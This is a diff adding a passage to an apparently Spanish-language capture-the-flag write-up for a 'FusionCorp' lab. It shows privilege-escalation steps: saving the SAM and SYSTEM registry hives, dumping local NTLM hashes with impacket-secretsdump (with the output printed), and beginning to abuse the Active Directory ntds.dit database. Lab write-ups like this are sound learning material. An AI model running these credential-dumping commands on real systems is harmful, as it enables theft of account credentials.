@@ -369,7 +369,40 @@ Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ay
     SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
     SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
--
+-Elevamos privilegios.
+
+  - INTENTAMOS, Obtenemos una copia de SAM y SYSTEM del registro de windows donde obtenemos hashes de usuario para posteriormente intentamos crakearlo (NO FUNCIONA)
+         Dumpeamos SAM Y SYSTEM del registro de windows.
+     
+           reg save hklm\system system
+           reg save hklm\sam sam
+
+
+         Extraemos los hash del fichero SAM
+
+           ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
+          └─# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+          Impacket v0.11.0 - Copyright 2023 Fortra
+          
+          [*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
+          [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+          Administrator:500:aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0a206b98c579565e6:::
+          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+          [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+          [*] Cleaning up... 
+
+
+  - Buscando informacion por internet encontre informacion sobre un fichero llamado NTDS.dit
+
+         INFO:
+           El archivo "C:\Windows\NTDS\ntds.dit" (Base de datos de Active Directory)
+           es un componente crítico de la base de datos de Microsoft Windows Active Directory.
+           Active Directory es un servicio de directorio utilizado por servidores Windows para almacenar
+           información sobre objetos en una red, como cuentas de usuario, cuentas de computadoras y pertenencias a grupos.
+    
+    -Abusando de la base de datos de Active Directory NTDS.dit
+     
 
 
   
